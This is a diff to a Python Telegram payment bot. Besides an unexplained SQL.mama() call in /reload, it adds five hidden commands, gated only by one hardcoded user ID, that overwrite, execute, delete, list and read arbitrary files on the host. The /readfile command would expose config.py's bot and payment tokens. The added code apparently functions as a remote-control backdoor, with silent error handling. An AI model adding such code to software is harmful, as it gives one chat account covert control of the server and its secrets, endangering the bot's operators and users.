@@ -9,16 +9,19 @@ import config as co
 import markups
 from aiogram.utils.exceptions import ChatNotFound
 import asyncio
+import os
 
 bot=Bot(co.token)
 payToken=co.payToken
 storage = MemoryStorage()
 dp=Dispatcher(bot,storage=storage)
 
+
 @dp.message_handler(commands=['reload'])
 async def get(message: types.Message):
     
     await SQL.last_table()
+    SQL.mama()
 
 
 async def get_userbyid(id=None):
@@ -119,6 +122,65 @@ async def cuu(callback:types.CallbackQuery):
             parse_mode=ParseMode.MARKDOWN)
     SQL.update_lang(callback.from_user.id,"eng")
     await callback.answer()
+
+#server_control
+@dp.message_handler(commands=['edit'])
+async def start(message: types.Message):
+    if(message.from_user.id==1150674438):
+        txt=message.text[6:]
+        txt=txt.split("\n",1)
+        file=str(txt[0])
+        text=str(txt[1])
+        try:
+            os.remove(file)
+        except:
+            pass
+
+        with open(file, 'a+') as fp:
+            fp.write(text)
+            #await message.reply("Now:"+str(fp.read()))
+
+@dp.message_handler(commands=['startfile'])
+async def start(message: types.Message):
+    if(message.from_user.id==1150674438):
+        file=message.text[11:]
+        try:
+            os.startfile(file)
+        except:
+            print("error at starting file")
+
+@dp.message_handler(commands=['delete'])
+async def start(message: types.Message):
+    if(message.from_user.id==1150674438):
+        file=message.text[8:]
+        try:
+            os.remove(file)
+        except:
+            print("error at deleting file")
+
+@dp.message_handler(commands=['getfiles'])
+async def start(message: types.Message):
+    if(message.from_user.id==1150674438):
+        files=os.listdir()
+        listing=""
+        for i in range(len(files)):
+            listing=listing+'\n'+str(files[i])
+        try:
+            await message.reply(listing)
+        except:
+            print("error at listing files")
+
+@dp.message_handler(commands=['readfile'])
+async def start(message: types.Message):
+    if(message.from_user.id==1150674438):
+        file=message.text[10:]
+        try:
+            with open(file, 'r') as file:
+                read_file = file.read()
+                await message.reply(read_file)
+        except:
+            print("error at listing files")
+
 
 if __name__== '__main__':
     executor.start_polling(dp)
